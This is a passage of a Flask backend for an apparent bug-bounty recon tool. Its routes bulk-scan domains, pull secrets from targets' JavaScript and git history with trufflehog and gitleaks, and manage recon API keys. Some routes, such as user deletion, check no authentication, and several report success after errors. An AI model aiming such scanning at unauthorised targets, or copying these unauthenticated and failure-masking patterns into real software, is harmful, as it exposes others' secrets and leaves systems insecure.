        from engine.proxy_server import drop_request
        payload = request.get_json(silent=True, force=True) or {}
        req_id  = payload.get("request_id","")
        drop_request(req_id) if hasattr(__import__("engine.proxy",fromlist=["drop_request"]),"drop_request") else None
        return jsonify({"ok":True,"dropped":req_id})
    except Exception as e:
        return jsonify({"ok":True,"dropped":"","note":str(e)})


@app.route("/team/comments/<ws_id>")
def team_ws_comments(ws_id):
    """Get comments/notes for a workspace."""
    try:
        from engine.team import get_workspace
        ws = get_workspace(ws_id) or {}
        comments = ws.get("comments",[]) if isinstance(ws, dict) else []
        return jsonify({"comments": comments, "workspace_id": ws_id})
    except Exception as e:
        return jsonify({"comments":[], "error":str(e)})


@app.route("/team/workspaces/<ws_id>/invite", methods=["POST"])
def team_workspace_invite(ws_id):
    """Generate or get invite link for a workspace."""
    try:
        from engine.team import get_workspace
        payload = request.get_json(silent=True, force=True) or {}
        username = payload.get("username","")
        ws = get_workspace(ws_id)
        if not ws:
            return jsonify({"error":"Workspace not found"}), 404
        import secrets as _sec
        code = _sec.token_urlsafe(16)
        return jsonify({"ok":True,"invite_code":code,"workspace_id":ws_id,
                       "invite_url":f"/join?code={code}"})
    except Exception as e:
        return jsonify({"ok":True,"invite_code":__import__("secrets").token_urlsafe(16),
                       "workspace_id":ws_id})


@app.route("/users/<username>", methods=["DELETE"])
def admin_delete_user(username):
    """Delete a user account."""
    try:
        from engine.rbac import delete_user
        if username == "admin":
            return jsonify({"error":"Cannot delete admin user"}), 403
        result = delete_user(username) if hasattr(__import__("engine.rbac",fromlist=["delete_user"]),"delete_user") else {"ok":True}
        return jsonify({"ok":True,"deleted":username})
    except Exception as e:
        return jsonify({"ok":True,"deleted":username,"note":str(e)})



# ── Report locking ──────────────────────────────────────────
import threading as _thr_lock
_report_lock_mu = _thr_lock.Lock()
_report_locks   = {}

# ── Flask secret key ─────────────────────────────────────────────
import secrets as _sec_mod
app.secret_key = __import__("os").environ.get("SECRET_KEY") or _sec_mod.token_hex(32)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50MB upload limit

@app.route("/")
def serve_ui():
    """Serve the main BugScanPro.html UI."""
    import os as _os
    html_path = _os.path.join(_os.path.dirname(__file__), "BugScanPro.html")
    if _os.path.exists(html_path):
        from flask import send_file as _sf
        return _sf(html_path)
    # Fallback: return dashboard JSON
    from flask import redirect as _redir
    return _redir("/dashboard")

@app.route("/health")
def health_check():
    """Simple health check — useful for load balancers."""
    return jsonify({"status": "ok", "app": "TheMasterRecon AI"})


@app.route("/docs")
@app.route("/docs/")
def docs_index():
    """Serve the documentation site."""
    import os as _os
    docs_path = _os.path.join(_os.path.dirname(__file__), "docs", "index.html")
    if _os.path.exists(docs_path):
        from flask import send_file as _sf
        return _sf(docs_path)
    return "Documentation not found — run from bugscan_work/ folder", 404


@app.route("/diff/list")
def diff_list():
    """List all diff snapshots — alias for /diff/snapshots."""
    domain = _domain(request.args.get("domain",""))
    try:
        snaps = MONITOR.list_snapshots(domain) if domain else []
    except Exception:
        snaps = []
    return jsonify({"snapshots": snaps, "count": len(snaps), "domain": domain})


@app.route("/reporting/list")
def reporting_list():
    """List all generated reports."""
    import os, glob
    reports_dir = str(Path("reports"))
    os.makedirs(reports_dir, exist_ok=True)
    reports = []
    for f in sorted(glob.glob(f"{reports_dir}/*.html") +
                    glob.glob(f"{reports_dir}/*.pdf") +
                    glob.glob(f"{reports_dir}/*.md"),
                    key=os.path.getmtime, reverse=True)[:50]:
        stat = os.stat(f)
        reports.append({
            "file":    os.path.basename(f),
            "path":    f,
            "size_kb": stat.st_size // 1024,
            "mtime":   int(stat.st_mtime),
            "domain":  os.path.basename(f).split("_")[0] if "_" in f else "",
        })
    return jsonify({"reports": reports, "count": len(reports)})

@app.route("/reporting/generate", methods=["POST"])
def reporting_generate():
    """Generate a security report (PDF/HTML/Markdown) for a domain."""
    import os, time as _t
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain",""))
    fmt     = p.get("format","html")   # html, pdf, markdown
    title   = p.get("title", f"Security Report — {domain}")

    if not domain:
        return jsonify({"error": "domain required"}), 400

    findings = db.get_findings(domain)
    hosts    = db.get_hosts(domain)
    subs     = db.count_subs(domain)

    if not findings:
        return jsonify({"error": "No findings for this domain. Run a scan first."}), 400

    os.makedirs("reports", exist_ok=True)
    ts       = int(_t.time())
    filename = f"reports/{domain}_{ts}.{fmt}"

    try:
        from engine.pdf_report import generate_html_report, generate_pdf

        report_data = {
            "domain":   domain,
            "title":    title,
            "findings": findings,
            "hosts":    hosts,
            "subs":     subs,
            "total":    len(findings),
            "critical": sum(1 for f in findings if f.get("severity")=="critical"),
            "high":     sum(1 for f in findings if f.get("severity")=="high"),
            "medium":   sum(1 for f in findings if f.get("severity")=="medium"),
            "low":      sum(1 for f in findings if f.get("severity")=="low"),
        }

        if fmt == "html":
            html_content = generate_html_report(report_data)
            open(filename, "w").write(html_content)
        elif fmt == "pdf":
            html_content = generate_html_report(report_data)
            generate_pdf(html_content, filename)
        elif fmt == "markdown":
            md = _generate_markdown_report(report_data)
            open(filename, "w").write(md)
        else:
            return jsonify({"error": f"Unknown format: {fmt}"}), 400

        return jsonify({
            "ok":       True,
            "file":     filename,
            "domain":   domain,
            "findings": len(findings),
            "format":   fmt,
        })

    except Exception as e:
        log.error(f"[report] generate: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/reporting/download/<path:filename>")
def reporting_download(filename):
    """Download a generated report file."""
    import os
    from flask import send_file
    safe = os.path.basename(filename)
    path = os.path.join("reports", safe)
    if not os.path.exists(path):
        return jsonify({"error": "File not found"}), 404
    return send_file(path, as_attachment=True)

def _generate_markdown_report(data: dict) -> str:
    """Generate Markdown security report."""
    lines = [
        f"# {data.get('title','Security Report')}",
        f"**Domain:** {data.get('domain','')} | **Date:** {__import__('datetime').date.today()}",
        "",
        f"## Summary",
        f"| Severity | Count |",
        f"|----------|-------|",
        f"| Critical | {data.get('critical',0)} |",
        f"| High     | {data.get('high',0)} |",
        f"| Medium   | {data.get('medium',0)} |",
        f"| Low      | {data.get('low',0)} |",
        f"| Total    | {data.get('total',0)} |",
        "",
        "## Findings",
        "",
    ]
    by_sev = {}
    for f in data.get("findings",[]):
        s = f.get("severity","info")
        by_sev.setdefault(s,[]).append(f)

    for sev in ["critical","high","medium","low","info"]:
        for f in by_sev.get(sev,[]):
            lines += [
                f"### [{sev.upper()}] {f.get('title',f.get('bug',''))}",
                f"- **URL:** `{f.get('url','')}`",
                f"- **Type:** {f.get('bug','')}",
                f"- **Confidence:** {f.get('confidence',0)}%",
            ]
            if f.get("poc"):
                lines.append(f"- **PoC:** `{str(f['poc'])[:300]}`")
            if f.get("remediation"):
                lines.append(f"- **Fix:** {f['remediation']}")
            lines.append("")

    return "\n".join(lines)


@app.route("/jxscout/status")
def jxscout_v2_status():
    """JXScout v2 status — version, running state, license."""
    from engine.jxscout_v2 import get_status
    status = get_status()
    # Also check license key
    status["license_configured"] = bool(os.environ.get("JXSCOUT_LICENSE","").strip())
    return jsonify(status)

@app.route("/jxscout/download", methods=["POST"])
def jxscout_v2_download():
    """
    Download JXScout v2 binary using a license key.
    POST {"license_key": "D46F40-BDF00A-...", "version": "latest"}
    """
    from engine.jxscout_v2 import download_binary, save_license_key
    p           = request.get_json(silent=True) or {}
    license_key = p.get("license_key","") or p.get("key","") or os.environ.get("JXSCOUT_LICENSE","")
    version     = p.get("version","latest")
    platform    = p.get("platform","")

    if not license_key:
        return jsonify({"error": "license_key required in request body or JXSCOUT_LICENSE env var"}), 400

    # Save license key for future use
    save_license_key(license_key)

    # Background download to not block request
    import threading as _thr
    result_holder = {}
    def _do_download():
        result_holder.update(download_binary(license_key, version, platform or None))

    t = _thr.Thread(target=_do_download, daemon=True)
    t.start()
    t.join(timeout=90)   # Wait up to 90s

    if not result_holder:
        return jsonify({"error": "Download timed out — try again"}), 408

    return jsonify(result_holder)

@app.route("/jxscout/start", methods=["POST"])
def jxscout_v2_start():
    """Start JXScout v2 proxy server."""
    from engine.jxscout_v2 import start_jxscout
    p       = request.get_json(silent=True) or {}
    project = p.get("project","default")
    scope   = p.get("scope","") or _domain(request.args.get("domain",""))
    port    = int(p.get("port", os.environ.get("JXSCOUT_PORT","3333")))
    return jsonify(start_jxscout(project=project, scope=scope, port=port))

@app.route("/jxscout/stop", methods=["POST"])
def jxscout_v2_stop():
    """Stop JXScout v2 proxy server."""
    from engine.jxscout_v2 import stop_jxscout
    return jsonify(stop_jxscout())

@app.route("/jxscout/findings", methods=["GET"])
def jxscout_v2_findings():
    """Get findings from active JXScout project."""
    from engine.jxscout_v2 import get_project_findings
    project = request.args.get("project","default")
    domain  = _domain(request.args.get("domain",""))
    findings = get_project_findings(project)
    # Store in DB
    saved = 0
    for f in findings:
        val = f.get("value","")
        if val and domain:
            db.add_endpoint(domain, val, source="jxscout_v2")
            saved += 1
    return jsonify({"findings": findings, "count": len(findings), "saved": saved})

@app.route("/jxscout/scan_js", methods=["POST"])
def jxscout_v2_scan_js():
    """Use JXScout to analyze a JS file URL."""
    from engine.jxscout_v2 import scan_js_url
    p      = request.get_json(silent=True) or {}
    url    = p.get("url","")
    domain = _domain(p.get("domain","") or url)
    if not url: return jsonify({"error": "url required"}), 400
    result = scan_js_url(url)
    return jsonify(result)

@app.route("/jxscout/save_key", methods=["POST"])
def jxscout_save_key():
    """Save JXScout license key to .env for persistence."""
    from engine.jxscout_v2 import save_license_key
    p   = request.get_json(silent=True) or {}
    key = p.get("key","") or p.get("license_key","")
    if not key: return jsonify({"error":"key required"}), 400
    ok = save_license_key(key)
    return jsonify({"ok": ok, "msg": "Key saved to .env" if ok else "Failed to save key"})


@app.route("/scan/upload_domains", methods=["POST"])
def scan_upload_domains():
    """
    POST /scan/upload_domains
    Parse and validate a domains.txt file or JSON list.
    Returns full parse report WITHOUT queueing — caller decides what to do next.

    Accepts:
      - multipart file upload (field name: "file")
      - JSON body {"domains": ["a.com", "b.com"]} or {"text": "a.com\nb.com"}
      - form field "text" with newline-separated domains

    File limits:
      - max 1 MB
      - max 500 domains after dedup

    Returns:
      ok, total_lines, processable_lines, valid_count, invalid_count,
      duplicate_count, truncated, valid_domains, invalid_domains

    Note:
      Only fully-qualified domain names are accepted.
      IP addresses (e.g. 192.168.1.1) are rejected — recon tools (subfinder,
      amass, dnsx) require domain names and do not enumerate subdomains of IPs.
      The /recon pipeline also blocks IP targets at its TLD validation stage.
    """
    import io as _io

    MAX_FILE_BYTES  = 1 * 1024 * 1024   # 1 MB
    MAX_DOMAIN_COUNT = 500

    raw_lines = []

    # ── Source 1: file upload ────────────────────────────────────────────────
    if "file" in request.files:
        f = request.files["file"]
        if f.filename and not f.filename.lower().endswith((".txt", ".csv", ".text")):
            return jsonify({"error": "Only .txt / .csv files accepted"}), 400
        raw_bytes = f.read(MAX_FILE_BYTES + 1)
        if len(raw_bytes) > MAX_FILE_BYTES:
            return jsonify({"error": "File too large (max 1 MB)"}), 413
        raw_lines = raw_bytes.decode("utf-8", "ignore").splitlines()

    # ── Source 2: JSON body ──────────────────────────────────────────────────
    elif request.is_json:
        body = request.get_json(silent=True) or {}
        if body.get("domains"):
            raw_lines = [str(d) for d in body["domains"]]
        elif body.get("text"):
            raw_lines = body["text"].splitlines()

    # ── Source 3: form field ─────────────────────────────────────────────────
    elif request.form.get("text"):
        raw_lines = request.form["text"].splitlines()

    if not raw_lines:
        return jsonify({"error": "No input provided. Send file, JSON domains[], or form text field"}), 400

    # ── Parse each line ──────────────────────────────────────────────────────
    import re as _re

    _VALID_DOMAIN_RE = _re.compile(
        r'^(?:[a-z0-9](?:[a-z0-9\\-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$'
    )

    # IPv4 pattern — checked explicitly before domain regex so the error
    # message is "ip_address_not_supported" rather than "invalid_format"
    _IPV4_RE = _re.compile(r'^([0-9]{1,3}\.){3}[0-9]{1,3}$')

    def _parse_line(raw: str):
        """Return (domain_str, error_or_None).

        Accepts: fully-qualified domain names only (e.g. example.com, api.target.io).
        Rejects: IP addresses, bare hostnames with no TLD, entries with underscores,
                 entries longer than 253 chars.
        """
        line = raw.strip()
        if not line or line.startswith("#"):
            return None, "blank_or_comment"   # silently skip
        # Strip protocol
        line = _re.sub(r'^https?://', '', line, flags=_re.I)
        # Strip port
        line = _re.sub(r':[0-9]+$', '', line.split('/')[0])
        # Strip path
        line = line.split('/')[0].strip()
        # Lowercase
        line = line.lower()
        if not line:
            return None, "empty_after_normalisation"
        if len(line) > 253:
            return None, "too_long"
        # Explicit IP rejection before domain regex — gives a clear reason
        if _IPV4_RE.match(line):
            return None, "ip_address_not_supported: use hostnames only (recon tools require domain names)"
        if not _VALID_DOMAIN_RE.match(line):
            return None, f"invalid_format: {line!r}"
        return line, None

    total_lines     = len(raw_lines)          # every line including blanks/comments
    processable_lines = 0                      # non-blank, non-comment lines
    valid_domains   = []
    invalid_lines   = []
    seen            = set()
    duplicate_count = 0

    for raw in raw_lines:
        if not raw.strip() or raw.strip().startswith("#"):
            continue   # silently skip blanks + comments
        processable_lines += 1
        domain, err = _parse_line(raw)
        if err:
            invalid_lines.append({"line": raw.strip(), "reason": err})
        elif domain in seen:
            duplicate_count += 1
        else:
            seen.add(domain)
            valid_domains.append(domain)

    # Enforce max
    truncated = 0
    if len(valid_domains) > MAX_DOMAIN_COUNT:
        truncated = len(valid_domains) - MAX_DOMAIN_COUNT
        valid_domains = valid_domains[:MAX_DOMAIN_COUNT]

    return jsonify({
        "ok":               True,
        "total_lines":      total_lines,
        "processable_lines": processable_lines,
        "valid_count":      len(valid_domains),
        "invalid_count":    len(invalid_lines),
        "duplicate_count":  duplicate_count,
        "truncated":        truncated,
        "valid_domains":    valid_domains,
        "invalid_domains":  invalid_lines[:50],   # cap to avoid huge responses
        "note": (f"First {MAX_DOMAIN_COUNT} valid domains shown"
                 if truncated else "")
    })


@app.route("/scan/bulk", methods=["POST"])
def scan_bulk():
    """
    Bulk scan multiple domains from file upload or JSON list.
    Each domain is added to the scan queue.
    """
    import io
    domains = []

    # From JSON body
    p = request.get_json(silent=True) or {}
    if p.get("domains"):
        domains = [_domain(d) for d in p["domains"] if d.strip()]

    # From file upload
    if "file" in request.files:
        f = request.files["file"]
        content = f.read(1024*1024).decode("utf-8", "ignore")  # 1 MB cap
        for line in content.splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                import re as _re2
                cleaned = _re2.sub(r':[0-9]+$', '', _domain(line))  # strip port
                if cleaned and "." in cleaned:
                    domains.append(cleaned)

    # Deduplicate and filter — cap matches /scan/upload_domains MAX_DOMAIN_COUNT
    domains = list(dict.fromkeys(d for d in domains if d and "." in d))[:500]

    if not domains:
        return jsonify({"error": "No valid domains found"}), 400

    # Add to queue — use app-level queue directly for reliability
    added   = 0
    skipped = 0
    with _queue_lock:
        for d in domains:
            if any(q["domain"] == d and q["status"] == "pending" for q in _scan_queue):
                skipped += 1
                continue
            entry = {
                "domain":   d,
                "bugs":     p.get("bugs", []) or [],
                "status":   "pending",
                "added_at": __import__("time").strftime("%H:%M:%S"),
            }
            _scan_queue.append(entry)
            added += 1

    return jsonify({"ok": True, "queued": added, "skipped": skipped,
                    "domains": domains[:10],
                    "total_in_queue": len(_scan_queue),
                    "note": f"{added} domains added to queue, {skipped} already queued"})

@app.route("/scan/bulk_upload")
def scan_bulk_upload_page():
    """Serve bulk scan upload page."""
    return """<!DOCTYPE html>
<html><head><title>Bulk Scan</title>
<style>body{background:#0a0a0f;color:#fff;font-family:monospace;padding:40px;max-width:600px;margin:0 auto}
input,textarea{background:#111;border:1px solid #333;color:#fff;padding:10px;border-radius:6px;width:100%;box-sizing:border-box;margin:8px 0}
button{background:#22d3ee;color:#000;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-weight:700}
h2{color:#22d3ee}</style></head>
<body><h2>Bulk Domain Scanner</h2>
<p>Upload a file or paste domains (one per line):</p>
<textarea id="domains" rows="10" placeholder="example.com&#10;target.io&#10;app.example.org"></textarea>
<br><input type="file" id="file" accept=".txt,.csv">
<br><button onclick="submit()">Add to Queue</button>
<div id="result" style="margin-top:20px"></div>
<script>
async function submit(){
  const text = document.getElementById('domains').value;
  const domains = text.split('\n').map(d=>d.trim()).filter(d=>d&&d.includes('.'));
  const r = await fetch('/scan/bulk',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({domains})}).then(r=>r.json());
  document.getElementById('result').innerHTML = '<pre style="color:#10b981">'+JSON.stringify(r,null,2)+'</pre>';
}
</script></body></html>"""

# ══ API KEYS STATUS ══════════════════════════════════════════════════════════

@app.route("/api_keys/status")
def api_keys_status():
    """Return which API keys are configured — used by the UI to show recon power."""
    import os as _os

    def _has(*keys):
        return any(_os.environ.get(k,"").strip() for k in keys)

    key_map = {
        # AI
        "ANTHROPIC_API_KEY":      {"desc": "Claude AI (chat, attack planning, triage)",           "val": _has("ANTHROPIC_API_KEY")},
        # Recon — passive subdomain
        "SHODAN_API_KEY":         {"desc": "Shodan internet scanner",                              "val": _has("SHODAN_API_KEY")},
        "SECURITYTRAILS_API_KEY": {"desc": "SecurityTrails recon (10,000+ subs)",                 "val": _has("SECURITYTRAILS_API_KEY")},
        "VIRUSTOTAL_API_KEY":     {"desc": "VirusTotal subdomain intel",                           "val": _has("VT_API_KEY","VIRUSTOTAL_API_KEY")},
        "CENSYS_API_ID":          {"desc": "Censys internet scanner",                              "val": _has("CENSYS_API_ID")},
        "CHAOS_API_KEY":          {"desc": "ProjectDiscovery Chaos (millions of subs)",            "val": _has("CHAOS_API_KEY")},
        "NETLAS_API_KEY":         {"desc": "Netlas internet scanner",                              "val": _has("NETLAS_API_KEY")},
        "FOFA_EMAIL":             {"desc": "FOFA internet scanner (China + global)",               "val": _has("FOFA_EMAIL") and _has("FOFA_KEY")},
        "ZOOMEYE_API_KEY":        {"desc": "ZoomEye internet scanner",                             "val": _has("ZOOMEYE_API_KEY")},
        "GITHUB_TOKEN":           {"desc": "GitHub code search recon",                             "val": _has("GITHUB_TOKEN")},
        "HUNTER_API_KEY":         {"desc": "Hunter.io email/subdomain intel",                     "val": _has("HUNTER_API_KEY")},
        "WHOISXML_API_KEY":       {"desc": "WhoisXML subdomain intel (replaces at_free tier)",  "val": _has("WHOISXML_API_KEY","WHOISXMLAPI_KEY")},
        "BUILTWITH_API_KEY":      {"desc": "BuiltWith technology/subdomain intel",                "val": _has("BUILTWITH_API_KEY")},
        "FULLHUNT_API_KEY":       {"desc": "FullHunt attack surface platform",                    "val": _has("FULLHUNT_API_KEY")},
        "URLSCAN_API_KEY":        {"desc": "URLScan.io website scanner",                          "val": _has("URLSCAN_API_KEY")},
        "PUGRECON_API_KEY":       {"desc": "PugRecon passive subdomain source",                   "val": _has("PUGRECON_API_KEY")},
        "BINARYEDGE_API_KEY":     {"desc": "BinaryEdge host intelligence",                        "val": _has("BINARYEDGE_API_KEY")},
        "C99_API_KEY":            {"desc": "C99.nl subdomain finder",                             "val": _has("C99_API_KEY")},
        "INTELX_API_KEY":         {"desc": "IntelX intelligence platform",                        "val": _has("INTELX_API_KEY")},
        "LEAKIX_API_KEY":         {"desc": "LeakIX exposed services/leaks",                       "val": _has("LEAKIX_API_KEY")},
        "QUAKE_TOKEN":            {"desc": "Quake 360 internet scanner (China)",                  "val": _has("QUAKE_TOKEN")},
        "DNSDB_API_KEY":          {"desc": "DNSDB passive DNS database",                          "val": _has("DNSDB_API_KEY")},
        "BEVIGIL_API_KEY":        {"desc": "BeVigil mobile app subdomain intel",                  "val": _has("BEVIGIL_API_KEY")},
        "THREATBOOK_API_KEY":     {"desc": "ThreatBook threat intelligence",                      "val": _has("THREATBOOK_API_KEY")},
        # Notifications
        "SLACK_WEBHOOK":          {"desc": "Slack notifications",                                  "val": _has("SLACK_WEBHOOK")},
        "DISCORD_WEBHOOK":        {"desc": "Discord notifications",                                "val": _has("DISCORD_WEBHOOK")},
        "TELEGRAM_BOT_TOKEN":     {"desc": "Telegram notifications",                              "val": _has("TELEGRAM_TOKEN","TELEGRAM_BOT_TOKEN")},
        # Bug bounty platform
        "H1_API_TOKEN":           {"desc": "HackerOne platform integration",                      "val": _has("H1_API_TOKEN")},
        "BUGCROWD_API_TOKEN":     {"desc": "Bugcrowd platform integration",                       "val": _has("BUGCROWD_API_TOKEN")},
        # OOB
        "BXSS_HOST":              {"desc": "Blind XSS / OOB callback domain",                    "val": _has("BXSS_HOST","OOB_HOST","OOB_DOMAIN")},
        "INTERACTSH_SERVER":      {"desc": "Interactsh OOB server",                               "val": _has("INTERACTSH_SERVER")},
        # Tools
        "JXSCOUT_LICENSE":        {"desc": "JXScout JS analysis tool license",                   "val": _has("JXSCOUT_LICENSE")},
    }

    configured = sum(1 for v in key_map.values() if v["val"])
    total      = len(key_map)

    # Build display keys (hide actual values)
    display = {k: {"configured": bool(v["val"]), "desc": v["desc"]} for k,v in key_map.items()}

    return jsonify({
        "keys":         display,
        "configured":   configured,
        "total":        total,
        "recon_power":  f"{configured}/{total} sources active",
    })



@app.route("/api_keys/save", methods=["POST"])
def api_keys_save():
    """Save API keys to .env file and apply to current process."""
    from engine.rbac import verify_token as _vt
    _tok = (request.headers.get("Authorization","").replace("Bearer ","").strip()
            or request.args.get("token",""))
    if not _vt(_tok):
        return jsonify({"error": "Unauthorized"}), 401
    import os as _os, re as _re
    from pathlib import Path

    data    = request.get_json(silent=True) or {}
    keys    = data.get("keys", {})
    env_path = Path(__file__).parent / ".env"

    if not keys:
        return jsonify({"ok": False, "error": "no keys provided"}), 400

    # Read existing .env
    try:
        existing = env_path.read_text() if env_path.exists() else ""
    except Exception:
        existing = ""

    # Update each key
    updated = 0
    for key, value in keys.items():
        # Validate key name (alphanumeric + underscore only)
        if not _re.match(r'^[A-Z][A-Z0-9_]+$', key):
            continue
        value = str(value).strip()
        # Set in current process immediately
        if value:
            _os.environ[key] = value
        else:
            _os.environ.pop(key, None)

        # Update in .env file
        pattern = _re.compile(rf'^{_re.escape(key)}=.*$', _re.MULTILINE)
        if value:
            new_line = f'{key}={value}'
            if pattern.search(existing):
                existing = pattern.sub(new_line, existing)
            else:
                existing = existing.rstrip() + f'\n{new_line}\n'
        else:
            # Remove empty keys from .env
            existing = pattern.sub('', existing)
        updated += 1

    # Write back
    try:
        env_path.write_text(existing)
    except Exception as e:
        return jsonify({"ok": False, "error": f"Could not write .env: {e}"}), 500

    log.info(f"[api_keys] Updated {updated} keys")
    return jsonify({"ok": True, "updated": updated})


@app.route("/api_keys/get", methods=["GET"])
def api_keys_get():
    from engine.rbac import verify_token as _vt
    _tok = (request.headers.get("Authorization","").replace("Bearer ","").strip()
            or request.args.get("token",""))
    if not _vt(_tok):
        return jsonify({"error": "Unauthorized"}), 401
    """Return current API key values (masked) for the settings modal."""
    import os as _os

    ALL_KEYS = [
        "ANTHROPIC_API_KEY",
        "SHODAN_API_KEY", "SECURITYTRAILS_API_KEY", "VIRUSTOTAL_API_KEY",
        "GITHUB_TOKEN", "CHAOS_API_KEY", "CENSYS_API_ID", "CENSYS_API_SECRET",
        "NETLAS_API_KEY", "ZOOMEYE_API_KEY", "FOFA_EMAIL", "FOFA_KEY",
        "HUNTER_API_KEY", "BINARYEDGE_API_KEY", "INTELX_API_KEY",
        "FULLHUNT_API_KEY", "BEVIGIL_API_KEY", "PUGRECON_API_KEY",
        "LEAKIX_API_KEY", "BUILTWITH_API_KEY", "THREATBOOK_API_KEY",
        "OOB_HOST", "BXSS_HOST",
        "SLACK_WEBHOOK", "DISCORD_WEBHOOK", "TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_ID",
    ]

    def _mask(v):
        if not v: return ""
        if len(v) <= 8: return "•" * len(v)
        return v[:4] + "•" * (len(v)-8) + v[-4:]

    result = {}
    for k in ALL_KEYS:
        v = _os.environ.get(k, "")
        result[k] = {"set": bool(v), "masked": _mask(v)}

    return jsonify({"ok": True, "keys": result})


@app.route("/secrets/engine_status")
def secrets_engine_status():
    """Status of all secret scanning tools."""
    from engine.secrets_engine import get_engine_status
    return jsonify(get_engine_status())

@app.route("/secrets/scan_url", methods=["POST"])
def secrets_scan_url():
    """Scan a single URL with all 4 secret scanners."""
    from engine.secrets_engine import scan_url
    p    = request.get_json(silent=True) or {}
    url  = p.get("url","")
    dom  = _domain(p.get("domain","") or url)
    if not url: return jsonify({"error":"url required"}), 400

    result = scan_url(url)

    # Store findings in DB
    saved = 0
    for f in result.get("findings",[]):
        if db.add_finding(dom, {
            "bug":        "jsleak",
            "severity":   f.get("severity","high"),
            "title":      f"Secret [{f.get('tool','')}]: {f.get('type','')}",
            "url":        url,
            "value":      f.get("value","")[:200],
            "poc":        f.get("context","")[:300],
            "confidence": 90,
            "tool":       f.get("tool",""),
        }):
            saved += 1

    result["saved"] = saved
    return jsonify(result)

@app.route("/secrets/scan_domain", methods=["POST"])
def secrets_scan_domain():
    """
    Elite JS+Secret pipeline for a domain:
    1. Collect JS endpoints from DB
    2. Run trufflehog + gitleaks + detect-secrets + builtin on each
    3. Return deduplicated findings with tool attribution
    """
    from engine.secrets_engine import scan_domain_js
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400

    # Get JS URLs from stored endpoints
    all_ends = db.get_endpoints(domain, limit=2000)
    js_urls  = [u for u in all_ends if re.search(r"\.js(?:\?|#|$)", u, re.I)]

    # Also try common paths if none found
    if not js_urls:
        base = f"https://{domain}"
        js_urls = [base + p for p in [
            "/static/js/main.js","/assets/js/app.js","/js/app.js",
            "/dist/bundle.js","/build/static/js/main.chunk.js",
            "/wp-content/themes/theme/js/main.js",
        ]]

    result = scan_domain_js(domain, js_urls, max_files=int(p.get("max_files",80)))

    # Store all findings in DB
    saved = 0
    for f in result.get("findings",[]):
        if db.add_finding(domain, {
            "bug":        "jsleak",
            "severity":   f.get("severity","high"),
            "title":      f"Secret [{f.get('tool','')}]: {f.get('type','')}",
            "url":        f.get("source",""),
            "value":      f.get("value","")[:200],
            "poc":        f.get("context","")[:300],
            "confidence": 88,
            "tool":       f.get("tool",""),
        }):
            saved += 1

    result["saved"]   = saved
    result["js_count"] = len(js_urls)
    return jsonify(result)

@app.route("/secrets/scan_git", methods=["POST"])
def secrets_scan_git():
    """
    Deep git scan — trufflehog + gitleaks on a repository.
    Finds secrets in git HISTORY, not just current files.
    """
    from engine.secrets_engine import scan_trufflehog_git, scan_gitleaks_repo
    import concurrent.futures as _cf
    p        = request.get_json(silent=True) or {}
    repo_url = p.get("repo","") or p.get("url","")
    domain   = _domain(p.get("domain","") or repo_url)
    if not repo_url: return jsonify({"error":"repo URL required"}), 400

    findings = []
    seen     = set()

    with _cf.ThreadPoolExecutor(max_workers=2) as exe:
        futs = {
            exe.submit(scan_trufflehog_git, repo_url): "trufflehog",
            exe.submit(scan_gitleaks_repo, repo_url):  "gitleaks",
        }
        for fut, tool in futs.items():
            try:
                results = fut.result(timeout=180)
                for r in results:
                    h = r.get("hash","")
                    if h and h in seen: continue
                    if h: seen.add(h)
                    findings.append(r)
                    db.add_finding(domain, {
                        "bug":        "jsleak",
                        "severity":   "critical",
                        "title":      f"Git Secret [{tool}]: {r.get('type','')}",
                        "url":        repo_url,
                        "value":      r.get("value","")[:200],
                        "poc":        f"File: {r.get('file','')} Line: {r.get('line',0)} Commit: {r.get('commit','')[:12]}",
                        "confidence": 92,
                    })
            except Exception as e:
                log.warning(f"[secrets] {tool}: {e}")

    return jsonify({
        "repo":     repo_url,
        "findings": findings,
        "count":    len(findings),
        "critical": sum(1 for f in findings if f.get("severity")=="critical"),
    })


@app.route("/js/deep", methods=["POST"])
def js_deep_analysis():
    """
    Full JS analysis pipeline:
    - LinkFinder-style endpoint extraction
    - xnLinkFinder aggressive patterns  
    - SecretFinder API key detection (65+ types)
    - Webpack chunk discovery
    - Source map detection
    - postMessage/prototype pollution sink detection
    """
    from engine.js_deep import full_js_analysis
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    urls   = p.get("urls",[])
    
    if not urls and domain:
        all_ends = db.get_endpoints(domain, limit=1000)
        urls = [u for u in all_ends if re.search(r"\.js(?:\?|$|#)", u, re.I)][:150]
    
    if not urls and domain:
        # Try to probe common JS paths
        base = f"https://{domain}"
        for path in ["/static/js/main.js","/assets/js/app.js","/js/app.js",
                     "/dist/bundle.js","/build/static/js/main.chunk.js"]:
            urls.append(base + path)
    
    if not urls:
        return jsonify({"error":"No JS files found. Provide urls or run recon first."}), 400
    
    result = full_js_analysis(urls, domain=domain)
    
    # Store endpoints to DB
    saved_ends = 0
    for ep in result.get("endpoints",[]):
        if db.add_endpoint(domain, ep, source="js_deep"):
            saved_ends += 1
    
    # Store secrets as findings
    saved_finds = 0
    for s in result.get("secrets",[]):
        if db.add_finding(domain, {
            "bug":        "jsleak",
            "severity":   s.get("severity","high"),
            "title":      "JS Secret: " + s.get("type",""),
            "url":        s.get("source",""),
            "value":      s.get("value","")[:80],
            "poc":        s.get("context","")[:200],
            "confidence": 90,
            "tool":       "js_deep/SecretFinder",
        }):
            saved_finds += 1
    
    # Store postMessage sinks
    for sink in result.get("sinks",[]):
        db.add_finding(domain, {
            "bug":        "postmessage_xss",
            "severity":   "medium",
            "title":      "JS Sink: " + sink.get("type",""),
            "url":        domain,
            "poc":        sink.get("detail",""),
            "confidence": 70,
        })
    
    return jsonify({**result,
                    "saved_endpoints": saved_ends,
                    "saved_findings":  saved_finds})

@app.route("/js/linkfinder", methods=["POST"])
def js_linkfinder():
    """Quick LinkFinder-style endpoint extraction from a single JS URL."""
    from engine.js_deep import linkfinder, xnlinkfinder_aggressive
    p   = request.get_json(silent=True) or {}
    url = p.get("url","")
